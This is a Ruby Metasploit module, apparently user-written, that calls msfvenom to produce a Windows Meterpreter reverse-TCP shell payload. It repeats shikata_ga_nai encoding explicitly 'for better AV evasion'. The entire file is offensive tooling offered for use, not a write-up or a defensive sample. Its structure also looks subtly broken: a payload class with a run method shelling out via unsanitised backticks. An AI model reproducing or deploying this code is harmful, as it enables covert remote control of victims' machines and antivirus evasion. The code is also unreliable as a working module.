require 'msf/core'

class MetasploitModule < Msf::Payload
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Payload Generator',
      'Description' => %q{
        This module generates a custom reverse shell payload using specified encoding
        (e.g., x86/shikata_ga_nai) for better AV evasion.
      },
      'Author'      => ['Diogo'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_x86
    ))

    register_options(
      [
        OptString.new('LHOST', [true, 'Local host to connect back to']),
        OptInt.new('LPORT', [true, 'Local port to connect back to', 4444]),
        OptString.new('ENCODER', [true, 'Encoder to use', 'x86/shikata_ga_nai']),
        OptInt.new('ENCODECOUNT', [true, 'Number of encoding iterations', 3]),
        OptString.new('FORMAT', [true, 'Output format (raw, c, exe, elf)', 'raw'])
      ]
    )
  end

  def run
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    encoder = datastore['ENCODER']
    count = datastore['ENCODECOUNT']
    format = datastore['FORMAT']

    print_status("Generating payload with encoding: #{encoder}")

    cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -e #{encoder} -i #{count} -f #{format}"
    payload = `#{cmd}`

    if payload.empty?
      print_error("Failed to generate payload. Check msfvenom configuration.")
    else
      print_good("Generated encoded payload:")
      puts payload
    end
  end
end